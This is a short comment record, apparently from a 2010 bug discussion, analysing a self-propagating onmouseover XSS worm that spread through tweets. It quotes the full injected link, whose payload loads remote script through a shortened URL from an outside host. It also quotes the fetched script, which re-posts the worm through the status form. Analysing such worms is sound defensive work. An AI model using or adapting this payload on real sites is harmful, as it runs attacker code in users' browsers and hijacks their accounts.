@@ -1,0 +1,25 @@
+Comment-Id:	1712349
+Comment-Author:	avar
+Comment-Date:	Tue Sep 21 12:32:21 UTC 2010
+Comment-Type:	comment
+Parent-Id:	1712275
+
+I got one with this content:
+
+    http://t.co/@"style="font-size:999999999999px;"onmouseover="$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')"/
+
+With the URL expanding to:
+
+    http://is.gd/fl9A7
+
+Which is a 301 redirect to:
+
+    http://lexasoft.jino-net.ru/up1415.js
+
+Which has the content:
+
+    $('#status').val("http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\\u002f\\u002fis.gd\\u002ffl9A7')\"/");
+    $('.status-update-form').submit();
+
+So at least that one does nothing more than propagate itself, but it would be
+really easy to write one that's more harmful to users.
